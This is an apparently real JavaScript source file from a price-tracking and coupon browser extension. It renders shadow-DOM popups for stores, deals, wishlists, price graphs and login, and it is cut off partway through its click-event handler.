import Chart from 'chart.js/auto';
import 'chartjs-adapter-moment';
import jQuery from 'jquery';
import { round } from 'lodash';
import psl from 'psl';

import { add_wl_popup, get_graph_data, init_graph } from './graph';

import {
    close_cpn_procssng_popup_box, isCartPage, select_final_coupon, set_aac_storage, startautoapply
} from './auto_apply_coupon.js';

import { get_Saledata, is_flash } from './flash_sale.js';

import { storage } from '../../require/require';
import {
    aac_popup_temp, add_cpn_page_temp, add_store_popup, all_stores_temp, all_str_prd_crd, applyng_final_cpn_pp_temp, banner_carousel, banner_car_dot, banner_car_sld, bckgrnd_main, cpn_processing_temp, deals_cont, deals_hp_crd, empty_notif_temp, empty_wish_list, ext_main_temp_struc, flash_sale_reg_side_popup, flash_sale_side_popup, flsh_sale_accrdn_un_subs, flsh_sale_subs_crd, flsh_sale_temp_pg, flsh_sale_unsubs_crd, home_page_header, home_page_temp, ind_str_avl_cpn, ind_str_cpn_temp,
    ind_str_crd,
    ind_str_lst_cpn, loader, login_pg_tmp, login_to_add_prc_drp, logn_pg_otp_tmp, logn_pg_sign_up_tmp, logn_pg_vrfy_otp_tmp, log_out_conf_popup, manual_cpns_temp_pp, my_prof_sgn_out, my_prof_temp, navbar, no_cpn_found_pp_temp, no_working_cpn_temp, other_page_header, pg_popup_temp, price_drop_selector, procssng_aac_cpns_button, rec_prc_drp_crd, rec_used_coup_crd, sale_for_you_crd, save_prod_pg_temp, save_prod_prc_log_out_mod,
    save_prod_prc_succ_popup, sidePopup, succs_aac_popup, univ_loader, wish_list_product_elem,
    wish_list_prod_elem_style,manual_coupons_side_pp,all_str_prd_crd_css,deals_hp_crd_css,ind_str_avl_cpn_css,ind_str_lst_cpn_css,new_hm_pg_banner_carsl,
new_hm_bnnr_crsl_inp,
new_hm_bnnr_crsl_slide,
new_hm_bnnr_crsl_lbl,
} from './templates.js';

const baseUrl = 'https://flipshope.com:81/';

let global_all_stores_data,
  global_whishList_var,
  rend_side_pop,
  glb_str_det_var,
  global_auth_var,
  wish_str = '',
  carsl_obj = {},
  $s = jQuery.noConflict(),
  deals_glb_arr,
  loc_data_obj = {},
  ind_str_var,
  call_swtch = false,
  brwsr_act = { type: '', isOpen: false },
  grph_data_var = [],
  ind_str_by_url_var,
  main_ext_id = chrome.runtime.id,
  glb_prd_to_save_var = {
    type: '',
    store_id: '',
    title: '',
    img_url: '',
    start_price: 0,
    min_drop: '',
    expiry_date: '',
    pid: '',
    product_url: '',
    time_stamp: '',
  },
  onDragVar = false,
  clickRendVar = {},
  is_PID,
  sel_resp_prc_grph,
  glb_cpn_arr,
  aac_cpn_prss_anim = 0,
  fs_fls_sale_data_obj = { base: '', reg: '' },
  rec_crtd_subs_prd = {},
  mnl_cpn_sd_var,
  counter_carsl_glb_var = 2,
  total_carsl_glb_var,
  bnnr_carsl_clr_int_glb_var;

let wrapper_style = `
    position: fixed;
    top: 0px;
    right: 0px;
    width: 100vw;
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    background-color: rgba(0,0,0,.5) !important;
`;
    
let grabbable, ext_popup,  fs_init, mainExtSub, open_on_load;

export function set_popup_vars(i=0){
  try{
    grabbable = document.querySelector('#fs_div_all').shadowRoot;
    ext_popup = grabbable.querySelector('.extOtherPopups');
    mainExtSub = grabbable.querySelector('.mainExtSubCont');
    fs_init = 1; 
  }
  catch(e){
    if(!i) setTimeout(set_popup_vars,1000,1);
  }
}
// fetching all str...............
async function bd() {
  try {
    if (call_swtch) return true;
    let arr = [
      'fetch_rpd',
      'fetch_sfu',
      'fetch_deals',
      'fetch_all_stores',
      'fetch_advert',
      'fetch_notif',
      'fetch_ruc'
    ];
    for (let i = 0; i < arr.length; i++) {

      let d ='';
      if(arr[i] == 'fetch_rpd')d = {'limit':10};
      let result = await sendMessagePromise({
        dataMSg: { msg: arr[i], data: d },
      });
      if (
        arr[i] == 'fetch_rpd' ||
        arr[i] == 'fetch_deals' ||
        arr[i] == 'fetch_sfu' ||
        arr[i] == 'fetch_ruc'
      ) {
        loc_data_obj[arr[i]] = result;
      } else {
        console.log('bd............res_data', result, result.data);
        loc_data_obj[arr[i]] = result.data;
      }
      console.log(arr[i], ': ', result);
    }
    call_swtch = true;
    console.log('creating a fresh  local var...........', loc_data_obj);
  } catch (error) {
    console.log('fetching data above........err', error);
  }
}
// bd();

// fetching all str...............

// price graph manipualtor..........

function graph_manipulator(arr, dStr = '7d') {
  let chck = Array.isArray(arr);
  if (!chck && arr.data) arr = arr.data;

  const Days = 24 * 60 * 60 * 1000;
  let dateNow = Date.now();
  console.log(dateNow - 7 * Days);

  let thatDate;
  if (dStr == '7d') thatDate = new Date(dateNow - 7 * Days);
  if (dStr == '45d') thatDate = new Date(dateNow - 45 * Days);
  if (dStr == '180d') thatDate = new Date(dateNow - 180 * Days);
  // thatDate = new Date(dateNow-(7*Days));
  // let tempDate = new Date("2022-12-06");
  // console.log('thatDate',thatDate,'tempDate',tempDate);
  console.log('passing array parameter...', arr);
  let tempArr = arr.filter((e) => {
    let d = new Date(e[0]);
    if (thatDate <= d) return e;
  });

  console.log('temp arr', tempArr);
  return tempArr;
}

// price graph manipualtor..........



// ********************* REQUEST CALLS ********************
function sendMessagePromise(item) {
  console.log(item);
  
    return new Promise((resolve, reject) => {
      try {
        
        chrome.runtime.sendMessage(item, (response) => {
          console.log('promise response:', response);
          if (response && response.msg && response.data) {
            resolve(response.data);
        } else {
            reject('Something wrong in ', item, 'item');
          }
        });

      } catch (error) {
        console.log("this is chrome runtime execution error..",error);
      }
    });
}

// ********************* REQUEST CALLS ********************

export function click_event_listeners(
  shadowContainer,
  ext_ID,
  result_data = ''
) {
  let mainExtSub = $s($s(shadowContainer.shadowRoot).find(':first')[0]).find(
    '.mainExtSubCont'
  )[0];
  let ext_popup = $s(shadowContainer.shadowRoot).find('.extOtherPopups')[0];
  console.log('mainExtSub jdvnjvndfb', ext_popup);
  // ********************* EXTENSION MAIN ********************

  // ******************** common functions ******************
  function check_header(title = '', is_home_hdr = false, bkt = '') {
    if (is_home_hdr) {
      mainExtSub.querySelector(
        '.header_container'
      ).innerHTML = `${home_page_header(ext_ID)}`;
    } else {
      mainExtSub.querySelector(
        '.header_container'
      ).innerHTML = `${other_page_header(ext_ID, title, bkt)}`;
    }
  }

  function update_wl_sever(
    global_whishList_var,
    sel_indx_pds,
    prc_drp_val,
    cb
  ) {
    global_whishList_var[sel_indx_pds].prce_drp = `${prc_drp_val}`;// old...
    global_whishList_var[sel_indx_pds].min_drop = `${prc_drp_val}`;

    console.log(
      'price drop clicked..',
      prc_drp_val,
      global_whishList_var[sel_indx_pds].prce_drp,
      sel_indx_pds
    );
    sendMessagePromise({
      dataMSg: { msg: 'add_to_wish_list', data: global_whishList_var[sel_indx_pds] },
    })
      .then((result) => {
        cb(result);
      })
      .catch((error) => {
        console.log('update wl error', error);
      });
  }

  function carousel_slide(nav, sld_name) {
    let slidingCont = mainExtSub.querySelector(`.${sld_name}`),
      fcw = slidingCont.firstElementChild.offsetWidth,
      total_width = slidingCont.offsetWidth,
      noe = Math.round(total_width / fcw);

    if (!carsl_obj[sld_name]) carsl_obj[sld_name] = { sld_var: 0, curr_cnt: 0 };

    if (nav == 'prev') {
      // console.log('inside prev...',carsl_obj[sld_name].curr_cnt,carsl_obj[sld_name].sld_var);
      if (
        carsl_obj[sld_name].curr_cnt > 0 &&
        carsl_obj[sld_name].curr_cnt <= noe - 1
      ) {
        carsl_obj[sld_name].sld_var += fcw;
        carsl_obj[sld_name].curr_cnt -= 1;
        slidingCont.style.transform = `translateX(${carsl_obj[sld_name].sld_var}px)`;
      }
    } else {
      // console.log('inside else...',carsl_obj[sld_name].curr_cnt,carsl_obj[sld_name].sld_var);
      if (
        carsl_obj[sld_name].curr_cnt >= 0 &&
        carsl_obj[sld_name].curr_cnt <= noe - 2
      ) {
        carsl_obj[sld_name].sld_var -= fcw;
        carsl_obj[sld_name].curr_cnt += 1;
        // console.log('upd nxt...','curr_cnt:',carsl_obj[sld_name].curr_cnt,'sld_var:',carsl_obj[sld_name].sld_var);
        slidingCont.style.transform = `translateX(${carsl_obj[sld_name].sld_var}px)`;
      } else if (!(carsl_obj[sld_name].curr_cnt <= noe - 2)) {
        carsl_obj[sld_name].sld_var = 0;
        carsl_obj[sld_name].curr_cnt = 0;
        // console.log('upd nxt...','curr_cnt:',carsl_obj[sld_name].curr_cnt,'sld_var:',carsl_obj[sld_name].sld_var);
        slidingCont.style.transform = `translateX(${carsl_obj[sld_name].sld_var}px)`;
      }
    }

    // console.log("sldCont totwd:",total_width,'fcw',fcw,'prent:',prent,'noe:',noe);
  }

  function load_me_crd(ce, str) {
    let ind = Number(ce.getAttribute('indx')),
      lnk = '';

    if ('fetch_rpd' == str) {
      return (lnk = loc_data_obj[str][ind].product_url);
    }
    if ('fetch_sfu' == str) {
      return (lnk = loc_data_obj[str][ind].store_url);
    }
    if ('fetch_deals' == str) {
      return (lnk = loc_data_obj[str][ind].deal_url);
    }
    if ('fetch_ruc' == str) {
      let cpn_code = loc_data_obj[str][ind].Coupon_Code;
      navigator.clipboard.writeText(`${cpn_code}`);
      return (lnk = loc_data_obj[str][ind].store_url);
    }
    return lnk;
  }
  function check_go_bck(currentElem) {
    let bck_to = currentElem.getAttribute('bck_to');
    console.log('this is go bck function ...............');
    if (bck_to == 'home') ren_home_page(currentElem);
    if (bck_to == 'all_str') ren_all_str(currentElem);
    if (bck_to == 'cpn_pg') ren_ind_str_func(currentElem);
    if (bck_to == 'whs_lst')
      (async function call() {
        brwsr_act.isOpen = true;
        let result = await sendMessagePromise({
          dataMSg: { msg: 'fetch_whish_list', data: '' },
        });
        // bd();
        console.log('fetch_whish_list data result...', result);
        await call_render_wish_list(result);
      })();
  }

  // ******************** common functions ******************

  // ******************** rendering functions *******************

  function ren_all_str(currentElem) {
    check_header('All Stores', false, 'home');
    let allStr = str_maker(loc_data_obj['fetch_all_stores'], 'all_str_page');
    mainExtSub.querySelector('.contentBlock').innerHTML = `${all_stores_temp(
      ext_ID,
      allStr
    )}`;
  }
  function appendMdlCont(clss_nm, styl_str, temp) {
    let add_pop_mdl = document.createElement('div');
    add_pop_mdl.classList.add(`${clss_nm}`);
    add_pop_mdl.style.cssText = `${styl_str}`;
    add_pop_mdl.innerHTML = temp;
    mainExtSub.appendChild(add_pop_mdl);
  }
  function ren_ind_str_func(currentElem) {
    let ce = currentElem.getAttribute('indx_apcd'),
      bck_var = currentElem.getAttribute('bck_ins'),
      lst_cpn_str = '',
      avl_cpn_str = '',
      str_id = loc_data_obj['fetch_all_stores'][Number(ce)].store_id;
    console.log('ind str clicked', str_id);
    sendMessagePromise({ dataMSg: { msg: 'fetch_str_by_id', data: str_id } })
      .then((result) => {
        console.log('this is data recieved from ind str by id:', result);
        ind_str_var = result;
        avl_cpn_str = str_maker(result.coupons.coupons, 'avl_cpn');
        lst_cpn_str = str_maker(result.coupons.lsc_cpn, 'lst_cpn');
        check_header('Coupons', false, bck_var || 'all_str');

        mainExtSub.querySelector(
          '.contentBlock'
        ).innerHTML = `${ind_str_cpn_temp(
          ext_ID,
          ind_str_crd(ext_ID, result.metadata,result.coupons.coupons.length),
          lst_cpn_str,
          avl_cpn_str,
          result.coupons.coupons.length
        )}`;
        mainExtSub.querySelector('.nav_main_cont').innerHTML = `${navbar(
          ext_ID,
          is_flash,
          1
        )}`;
      })
      .catch((err) => console.log('error recieved from ind str by id:', err));
  }
  function ren_coupons_page(currentElem) {}
  // ******************* rendering functions ********************

  $s(shadowContainer.shadowRoot)
    .find(':first')
    .on('click input', '[event_type]', '', function (event) {
      let currentElem = event.currentTarget;
      console.log('main extension current element:...', currentElem);
      let action = currentElem.getAttribute('event_action');
      switch (action) {
        case 'close_ext_modal':
          close_main_ext_modal(1);
          break;

        case 'render_home':
          ren_home_page();
          break;

        case 'render_wishList':
          (async function call() {
            check_header('Wish List', false);
            // mainExtSub.querySelector('.nav_main_cont').innerHTML = `${navbar(ext_ID,is_flash,2)}`;
            global_auth_var = await chck_authentication_crrnt();
            let result = await sendMessagePromise({
              dataMSg: { msg: 'fetch_whish_list', data: '' },
            });
            await call_render_wish_list(result);
          })();
          break;

        case 'render_coupons':
          (async () => {
            check_header('Coupons');
            await ren_ind_store_by_url();
            mainExtSub.querySelector('.nav_main_cont').innerHTML = `${navbar(
              ext_ID,
              is_flash,
              3
            )}`;
          })();
          break;

        case 'render_profile':
          rend_my_prof_pg();
          break;

        case 'render_notif':
          check_header('Notification', false, 'home');
          console.log(
            'render_notif......loc_data',
            loc_data_obj['fetch_notif']
          );
          if (!loc_data_obj['fetch_notif']) {
            console.log('render_notif empty');
            mainExtSub.querySelector(
              '.contentBlock'
            ).innerHTML = `${empty_notif_temp(ext_ID)}`;
          } else {
            console.log('render_notif something....');
          }
          mainExtSub.querySelector('.nav_main_cont').innerHTML = `${navbar(
            ext_ID,
            is_flash,
            4
          )}`;
          break;

        case 'sel_prc_drp':
          (async function callME() {
            global_auth_var = await chck_authentication_crrnt();
            if (!global_auth_var) {
              currentElem.blur();
              load_login_popup_wl();
              return;
            }
            let prc_drp_val = currentElem;
            let sel_indx_pds = prc_drp_val.getAttribute('pds_index');
            prc_drp_val = prc_drp_val.querySelector(
              `:nth-child(${prc_drp_val.selectedIndex + 1})`
            );
            prc_drp_val = prc_drp_val.getAttribute('value');
            global_whishList_var[sel_indx_pds].prce_drp = `${prc_drp_val}`;// old...
            global_whishList_var[sel_indx_pds].min_drop = `${prc_drp_val}`;
            console.log(
              'price drop clicked..',
              prc_drp_val,
              global_whishList_var[sel_indx_pds].prce_drp,
              sel_indx_pds
            );
            sendMessagePromise({
              dataMSg: {
                msg: 'add_to_wish_list',
                data: global_whishList_var[sel_indx_pds],
              },
            })
              .then((result) => {
                console.log(
                  'update result succ..',
                  result
                );
              })
              .catch((error) => {
                console.log('update wl error', error);
              });
          })();
          break;

        case 'add_prc_drp':
          (async function call() {
            global_auth_var = await chck_authentication_crrnt();
            if (!global_auth_var) {
              let apd_log_mdl = document.createElement('div');
              apd_log_mdl.classList.add('apd_login_mdl_main');
              apd_log_mdl.style.cssText =
                'position: absolute;top: 48px;width: 350px;height: 550px;background-color: rgb(115 117 119 / 70%);display: flex;justify-content: center;align-items: center';
              apd_log_mdl.innerHTML = `${login_to_add_prc_drp}`;
              mainExtSub.appendChild(apd_log_mdl);
            } else {
              let ind = currentElem.getAttribute('key_index'),
                elem = mainExtSub.querySelector(`.prc_in${ind}`),
                not_el = mainExtSub.querySelector(`.ssci${ind}`),
                crt_el = document.createElement('img');

              crt_el.setAttribute(
                'src',
                `chrome-extension://${ext_ID}/assets/imgs/bellside.png`
              );
              crt_el.setAttribute('class', 'bellside_wishlist');
              not_el.appendChild(crt_el);

              console.log('add prc drp elem', ind);
              console.log('kdsbndfjkbnfdjkbfdjkb', elem);
              elem.innerHTML = `${price_drop_selector('Any', ind)}`;
              update_wl_sever(global_whishList_var, ind, 'Any', (result) => {
                console.log('this is updated wl cb:', result);
              });
            }
          })();

          break;

        case 'redirect_to_login':
          sendMessagePromise({
            dataMSg: { msg: 'redirect_to_login', data: '' },
          })
            .then((result) => {
              console.log(result);
              mainExtSub.innerHTML = '';
              ext_popup.querySelector('.side_popup_cont').style.display =
                'block';
            })
            .catch((error) =>
              console.log('this is error redirect to login', error)
            );
          break;

        case 'close_apd_login_modl':
          let apd_main_dom = mainExtSub.querySelector('.apd_login_mdl_main');
          mainExtSub.removeChild(apd_main_dom);
          break;

        case 'redirect_to_edit_prof':
          (
            async function callMe(){
              console.log("this is redirect to edit...");
              let url = baseUrl+`account/profile`;
              let resp = await sendMessagePromise({
                dataMSg: { msg: 'crt_anothr_tab', data: url },
              });
              console.log("this is response redirect_to_edit_prof..",resp);
            }
          )();
        break;

        case 'hm_pg_crsl_redir':
          (
            async function callMe(){
              let k = currentElem.getAttribute('mysldkeyssss'),
              slide = loc_data_obj['fetch_advert'][k];

              console.log("clicked slide data carousel home page...",slide);
              let resp = await sendMessagePromise({
                dataMSg: { msg: 'crt_anothr_tab', data: slide.url },
              });
              console.log("this is response hm_pg_crsl_redir..",resp);

            }
          )();
        break;

        case 'remove_wl_prod':
          // let my_curr_prod = Number(currentElem.getAttribute("key_index"));
          // console.log("this is key ..........", my_curr_prod);
          // mainExtSub.querySelector(`.sswc${my_curr_prod}`).style.display = "none";
          // global_whishList_var.splice(my_curr_prod, 1);
          // sendMessagePromise({ dataMSg: { msg: 'update_wish_list_arr', data: global_whishList_var } })
          //     .then((result) => {
          //         console.log('update result succ..');
          //         render_wishList(result, 2);
          //     })
          //     .catch((error) => { console.log('update wl error', error) })

          // code temporarily commented, needed remove wish-list api...

          (
            async function callMe(){
              let k = currentElem.getAttribute('key_index'),
              pid = currentElem.getAttribute('pid'),
              sid = currentElem.getAttribute('sid'),
              brk = false;
              
              
              console.log(' remove wish-list api needed...',global_whishList_var[Number(k)]);
              grabbable.querySelector('.contentBlock').innerHTML = `${univ_loader(
                '350px',
                '553px'
                )}`;

              let is_online   = await chck_authentication_crrnt();

              if(is_online){

                let resp  = await sendMessagePromise({dataMSg:{msg:'remove_wl_prod',data:{
                  pid:pid,
                  store_id:sid
                }}});

                if(resp.code == 200){
                  console.log("remove wish-list succ response...");
  
  
                  global_whishList_var&&global_whishList_var.forEach((elem,i)=>{
                    if((elem.store_id == sid)&&(elem.pid == pid)){
                      global_whishList_var.splice(i,1);
                      brk = true;
                    }
                  });
  
                  if(!brk){
                    let local_wl = await storage('get', 'loc_wish_list');
                    local_wl.forEach((elem,x)=>{
                      if((elem.store_id == sid)&&(elem.pid == pid))local_wl.splice(x,1);
                    });
                    await storage('set',{loc_wish_list:local_wl});
                  }
  
                  grabbable.querySelector('[event_action="render_wishList"]').click();
  
                  // creating response element...
                  // let e = document.createElement('div');
                  // e.setAttribute('class','remove_wl_response');
                  // e.innerHTML = `${save_prod_prc_succ_popup(
                  //   'successfully removed!'
                  // )}`;
                  // grabbable.querySelector('.contentBlock').appendChild(e);
  
                }else{
                  console.log("remove wish-list bad response...");
                }

              }else{

                let local_wl = await storage('get', 'loc_wish_list');
                    local_wl.forEach((elem,x)=>{
                      if((elem.store_id == sid)&&(elem.pid == pid))local_wl.splice(x,1);
                    });
                    await storage('set',{loc_wish_list:local_wl});

                grabbable.querySelector('[event_action="render_wishList"]').click();

              }
 
            }
          )();

          break;

        case 'prev_slide_ruc':
          carousel_slide('prev', 'ruc_cont');
          break;

        case 'prev_slide_rpd':
          carousel_slide('prev', 'rpd_cont');
          break;

        case 'prev_slide_deal':
          carousel_slide('prev', 'deal_cont');
          break;

        case 'prev_slide_sfu':
          carousel_slide('prev', 'sfu_cont');
          break;

        case 'nxt_slide_ruc':
          carousel_slide('nxt', 'ruc_cont');
          break;

        case 'nxt_slide_rpd':
          carousel_slide('nxt', 'rpd_cont');
          break;

        case 'nxt_slide_deal':
          carousel_slide('nxt', 'deal_cont');
          break;

        case 'nxt_slide_sfu':
          carousel_slide('nxt', 'sfu_cont');
          break;
          
        case 'hm_pg_navgt_slide':
          (()=>{
            let x = currentElem.getAttribute("label_crsl_ssssv");
            grabbable.getElementById('slide' + x).checked = true;
            counter_carsl_glb_var = x;
          })();
        break;

        case 'load_sfu':
          sendMessagePromise({
            dataMSg: {
              msg: 'load_sfu',
              data: load_me_crd(currentElem, 'fetch_sfu'),
            },
          })
            .then((result) => console.log('load_sfu', result))
            .catch((err) => console.log('load_sfu err:', err));

          break;
        case 'load_deal':
          sendMessagePromise({
            dataMSg: {
              msg: 'load_deal',
              data: load_me_crd(currentElem, 'fetch_deals'),
            },
          })
            .then((result) => console.log('load_deal', result))
            .catch((err) => console.log('load_deal err:', err));
        break;
        case 'load_rpd':
          // sendMessagePromise({
          //   dataMSg: {
          //     msg: 'load_rpd',
          //     data: load_me_crd(currentElem, 'fetch_rpd'),
          //   },
          // })
          //   .then((result) => console.log('load_rpd', result))
          //   .catch((err) => console.log('load_rpd err:', err));

          (async ()=>{
            let indx = currentElem.getAttribute('indx'),
             rpd_data = loc_data_obj['fetch_rpd'][indx];

             let url = baseUrl+`redirect/${rpd_data.PID}/${rpd_data.Store}`;

             let resp = await sendMessagePromise({
              dataMSg: { msg: 'crt_anothr_tab', data: url },
            });
            console.log('response load rpd inside....abcd',resp);
             console.log("load rpd data...",rpd_data);
          })();
        break;
        case 'load_ruc':
          (function callMe() {
            sendMessagePromise({
              dataMSg: {
                msg: 'load_ruc',
                data: load_me_crd(currentElem, 'fetch_ruc'),
              },
            })
              .then((result) => console.log('load_ruc', result))
              .catch((err) => console.log('load_ruc err:', err));
          })();
          break;
        case 'see_all_Deals':
          check_header('Deals', false, 'home');
          let deals_str = str_maker(loc_data_obj['fetch_deals'], 'deals_page');
          mainExtSub.querySelector('.contentBlock').innerHTML = `${deals_cont(
            deals_str
          )}`;
          mainExtSub.querySelector('.nav_main_cont').innerHTML = `${navbar(
            ext_ID,
            is_flash,
            1
          )}`;
          break;
        case 'see_all_All Store':
          console.log('see_all_All Store inside....abcd');
          check_header('All Stores', false, 'home');
          (function make_all_str() {
            let allStr = str_maker(
              loc_data_obj['fetch_all_stores'],
              'all_str_page'
            );
            mainExtSub.querySelector(
              '.contentBlock'
            ).innerHTML = `${all_stores_temp(ext_ID, allStr)}`;
          })();
          mainExtSub.querySelector('.nav_main_cont').innerHTML = `${navbar(
            ext_ID,
            is_flash,
            1
          )}`;
          break;
        case 'see_all_Sale For You!':
          console.log('see_all_Sale For You! inside....abcd');
          check_header('Sale For You', false, 'home');
          mainExtSub.querySelector('.contentBlock').innerHTML = ``;
          mainExtSub.querySelector('.nav_main_cont').innerHTML = `${navbar(
            ext_ID,
            is_flash,
            1
          )}`;
          break;
        case 'see_all_Recent Price Drop':
          (async function callMe(){

            let url = baseUrl+'recentpricedrop';
            let resp = await sendMessagePromise({
              dataMSg: { msg: 'crt_anothr_tab', data: url },
            });
            console.log('response see_all_Recent Price Drop inside....abcd',resp);
          })()
          // check_header('Recent Price Drop', false, 'home');
          // mainExtSub.querySelector('.contentBlock').innerHTML = ``;
          // mainExtSub.querySelector('.nav_main_cont').innerHTML = `${navbar(
          //   ext_ID,
          //   is_flash,
          //   1
          // )}`;



          break;
        case 'see_all_Recently Used Coupons':
          console.log('see_all_Recently Used Coupons inside....abcd');
          check_header('Recently Used Coupons', false, 'home');
          mainExtSub.querySelector('.contentBlock').innerHTML = ``;
          mainExtSub.querySelector('.nav_main_cont').innerHTML = `${navbar(
            ext_ID,
            is_flash,
            1
          )}`;
          break;
        case 'go_bck':
          console.log('go back clicked');
          check_go_bck(currentElem);
          break;
        case 'filter_all_str':
          // console.log("foilter all str running....");
          (function allStrFiltr(mainArr){
            
            let newArr = [];
            newArr = JSON.parse(JSON.stringify(mainArr)); // its a deep copy please don't change it..

            newArr.map((elem)=>{
              let x = elem.store_name.toLowerCase().includes(currentElem.value.toLowerCase());
              if(x){
                elem.display = 'flex';
              }else{
                elem.display = 'none';
              }
            });

            console.log("main array for all stores...",loc_data_obj['fetch_all_stores']);
            
            let allStr = str_maker(newArr,'all_str_page');
            mainExtSub.querySelector('.all_str_wrppr').innerHTML = `${allStr}`;
            })(loc_data_obj['fetch_all_stores']);
          break;
        case 'ren_ind_str_pg':
          ren_ind_str_func(currentElem);
          break;

        case 'visit_ind_str':
          (function callMe() {
            console.log("this is visit_ind_str ind_str_var:...",ind_str_var);
            sendMessagePromise({
              dataMSg: { msg: 'visit_ind_str', data: ind_str_var.store_info.store_url },
            })
              .then((result) =>
                console.log('this is result vis ind str', result)
              )
              .catch((error) =>
                console.log('this is vis ind str error', error)
              );
          })();
          break;

        case 'ren_add_cpn_pg':
          (function callMe() {
            console.log('this is add cpn popup...');
            let styl_str = `
                    position: absolute;
                    top: 48px;
                    width: 350px;
                    height: 550px;
                    background-color: rgb(115 117 119 / 70%);
                    display: flex;
                    justify-content: center;
                    align-items: center`,
              temp = `<h1>add popup modal</h1>`;
            // appendMdlCont('add_pop_mdl_main',styl_str,temp);
            check_header('Add Coupon', false, 'cpn_pg');
            mainExtSub.querySelector(
              '.contentBlock'
            ).innerHTML = `${add_cpn_page_temp(ext_ID, '')}`;
            mainExtSub.querySelector('.nav_main_cont').innerHTML = ``;
          })();
          break;

        case 'copy_cpn':
          (function callMe() {
            let cpn = currentElem.querySelector('span').innerText,
              elem = currentElem.querySelector('.couponsCopied');
            elem.style.display = 'block';

            setTimeout(() => {
              elem.style.display = 'none';
            }, 1000);

            console.log('cpoy cpn clicked !', cpn);
            navigator.clipboard.writeText(`${cpn}`);
          })();
          break;

        case 'reg_inp_form':
          (function callMe() {
            let ce = mainExtSub
                .querySelector('.formsCont')
                .querySelectorAll('[name]'),
              val = {};
            ce.forEach((elem) => {
              val[elem.name] = elem.value;
              elem.value = '';
            });
            if (!val['cpn_cde']) {
              console.log('only error log');
              mainExtSub.querySelector('.err_cpn').style.display = 'block';
              return true;
            }
            sendMessagePromise({ dataMSg: { msg: 'reg_inp_form', data: val } })
              .then((result) => {
                console.log('reg_inp_form res:....', result);
              })
              .catch((err) => console.log('reg_inp_form err.......', err));
            console.log(
              'this is reg inp change form ..........',
              val,
              'value',
              val['cpn_cde']
            );
          })();
          break;

        case '7_day_grh':
          (async function call() {
            await ren_prc_alrt_pg(glb_str_det_var, '7d');
          })();
          // mainExtSub.getElementById("a7dpg1").setAttribute("class","price_7day");
          // mainExtSub.getElementById("a7dpg2").setAttribute("class","price_7day mke_me_grey");
          break;

        case '45_day_grh':
          (async function call() {
            make_price_graph_pop(true);
            await ren_prc_alrt_pg(glb_str_det_var, '45d');
          })();
          // mainExtSub.getElementById("a7dpg1").setAttribute("class","price_7day mke_me_grey");
          // mainExtSub.getElementById("a7dpg2").setAttribute("class","price_7day");
          break;

        case '6_mn_grh':
          console.log('is_PID data 6m_graph...', is_PID);
          (async function call() {
            let url = baseUrl+`products/${is_PID.pid_this}/${is_PID.g_code.site_id}`;
            console.log('is_PID data...', is_PID);
            let resp = await sendMessagePromise({
              dataMSg: { msg: '6_mn_grh', data: url },
            });
            console.log("this is response 6 months graph..",resp);
          })();
        break;

        case 'redirect_to_prod_pg':
          (
            async function callMe(){
              let e = currentElem.getAttribute('prd_key_ind');
              console.log('pid sid wish list...',global_whishList_var[Number(e)]);
              let pid = global_whishList_var[Number(e)].pid,
              sid = global_whishList_var[Number(e)].store_id;
              let url = baseUrl+`redirect/${pid}/${sid}`;

              let resp = await sendMessagePromise({
                dataMSg: { msg: '6_mn_grh', data: url },
              });
              console.log('this is response from redirect to product..',resp);
            }
          )();
        break;

        case 'render_flash_sale':
          rend_flsh_sale_page();
        break;          
        case 'ren_logn_scr':
          // mainExtSub.innerHTML = '';
          close_main_ext_modal();
          background_click_handlr(()=>{
            let cls = grabbable.querySelector('.logn_close_btn');
            let cls_prf = grabbable.querySelector('.sub_conatiner_close_img');
            if(cls)cls.click();
            if(cls_prf)cls_prf.click();
          });
          ext_popup.innerHTML = `${login_pg_tmp(ext_ID)}`;
          rend_side_pop = 0;
          document.body.style.overflow = 'hidden';
        break;

        case 'copy_ref_code':
          (function callMe() {
            let cpyVal =
              mainExtSub.querySelector('.footer_search_box').innerText;
            navigator.clipboard.writeText(`${cpyVal}`);

            mainExtSub.querySelector('.footer_search_box_copy').innerText = 'Copied!';
            setTimeout(()=>{
              mainExtSub.querySelector('.footer_search_box_copy').innerText = 'Copy'; 
            },1000);
          })();
          break;

        case 'ren_logout':
          (function callMe() {
            login_confrm_popup();
          })();
          break;

        case 'pls_log_out':
          (function callMe() {
            sendMessagePromise({ dataMSg: { msg: 'pls_log_out', data: '' } })
              .then((result) => {
                console.log('pls_log_out res:....', result);
                rend_my_prof_pg();
              })
              .catch((err) => console.log('pls_log_out err.......', err));
          })();
          break;

        case 'cancel_log_out':
          (function callMe() {
            let elem = mainExtSub.querySelector('.logn_confrm_pop_cont');
            mainExtSub.removeChild(elem);
          })();
          break;

        case 'ren_prc_lbl_drp_dwn':
          (function callMe() {
            'fetch_profile';
            sendMessagePromise({ dataMSg: { msg: 'fetch_profile', data: '' } })
              .then((result) => {
                console.log('usr auth result.... ren prc lbl drp dwn', result);
                (async function call() {
                  // let resp = await chck_prd_in_whishlist();

                  let elem = document.createElement('div');
                  if (result.code != 200) {
                    console.log('runnning now...');
                    mainExtSub
                      .querySelector('.prc_lst_dropdown')
                      .setAttribute('disabled', true);

                    elem.setAttribute('class', 'save_prod_prc_list_main_cont');
                    elem.innerHTML = `${save_prod_prc_log_out_mod()}`;
                    mainExtSub.querySelector('.contentBlock').appendChild(elem);
                    mainExtSub
                      .querySelector('.prc_lst_dropdown')
                      .removeAttribute('disabled');
                    return true;
                  }

                  // elem.setAttribute('class','save_prod_prc_list_main_cont');
                  // elem.setAttribute('event_type','click');
                  // elem.setAttribute('event_action','toggle_prc_drop_down');
                  // elem.innerHTML = `${save_prod_prc_list(resp)}`;
                  // mainExtSub.querySelector('.contentBlock').appendChild(elem);
                  // return true;

                  // let elem = document.createElement('div');
                })();
              })
              .catch((error) => {
                console.log('usr auth err.... ren prc lbl drp dwn', error);
              });
          })();
          break;

        case 'cls_svppll_modal':
          (function callMe() {
            let e = mainExtSub.querySelector('.save_prod_prc_list_main_cont');
            mainExtSub.querySelector('.contentBlock').removeChild(e);
          })();
          break;

        case 'set_prc_drop_in_prd':
          (async function callMe() {
            try {
              //    let res =  await chck_authentication_crrnt();

              //    if(!res){

              //     let e = mainExtSub.querySelector('.save_prod_prc_list_main_cont');
              //     if(e)mainExtSub.querySelector('.contentBlock').removeChild(e);

              //     let elem = document.createElement('div');
              //     elem.setAttribute('class','save_prod_prc_list_main_cont ');
              //     elem.innerHTML = `${save_prod_prc_log_out_mod()}`;
